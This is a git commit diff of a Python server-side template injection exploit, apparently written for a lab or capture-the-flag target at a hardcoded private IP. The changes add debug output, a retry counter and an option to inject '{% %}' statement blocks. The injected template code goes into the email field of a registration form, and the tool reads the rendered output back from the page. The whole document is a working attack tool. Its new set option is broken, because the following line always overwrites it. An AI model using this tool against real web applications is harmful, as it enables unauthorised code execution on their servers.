9daf7b779995b90c59573bf5ba438a4c12c74765
Jono Nicholas <jono.nicholas@hotmail.co.uk>
2021-02-07 20:57:37 +0000

    Added debug printing and set capability

--- ssti.py
+++ ssti.py
@@ -6,11 +6,19 @@ from argparse import ArgumentParser
 
 
 class SSTI():
-	def __init__(self, url):
+	def __init__(self, url, debug, setvar):
 		self.url = url
+		self.debug = debug
+		self.count = 0
+		self.set = setvar
 
 	def register(self, code, pw='a'):
-		user = '{{' + code + '}}@b.co'
+		if self.set:
+			user = '{%' + quote_plus(code) + '%}@b.co'
+		user = '{{' + quote_plus(code) + '}}@b.co'
+		if self.debug:
+			print(user)
+
 		pw = quote_plus(pw)
 		headers = {
 			'Accept-Encoding': 'gzip, deflate',
@@ -21,23 +29,42 @@ class SSTI():
 			'password': pw,
 			'confirm': pw
 		}
+
+		if self.debug > 1:
+			print('Headers: {}'.format(headers))
+			print('Data: {}'.format(data))
+
 		r = requests.post(self.url, headers=headers, data=data)
+		if r.status_code != 200:
+			return r.status_code, r.reason
+
 		soup = BeautifulSoup(r.text, features='lxml')
+
+		if self.debug > 2:
+			print(soup.prettify())
+
 		template = soup.select_one('p.help-block')
 
 		if template:
 			return template.text
+		elif self.count > 1:
+			return 'No result for {}'.format(user)
 		else:
-			return register(user, pw)
+			self.count += 1
+			return self.register(code, pw)
 
 
 def get_args():
 	parser = ArgumentParser()
 	parser.add_argument('code', help='Code to inject')
+	parser.add_argument('-v', action='count', default=0, help='Verbosity')
+	parser.add_argument('-s', '--set', action='store_true',
+						help='Set a variable')
 	return parser.parse_args()
 
 
 if __name__ == '__main__':
 	args = get_args()
-	temp = SSTI('http://10.102.2.251/user/register')
+	temp = SSTI('http://10.102.2.251/user/register', debug=args.v,
+				setvar=args.set)
 	print(temp.register(args.code))
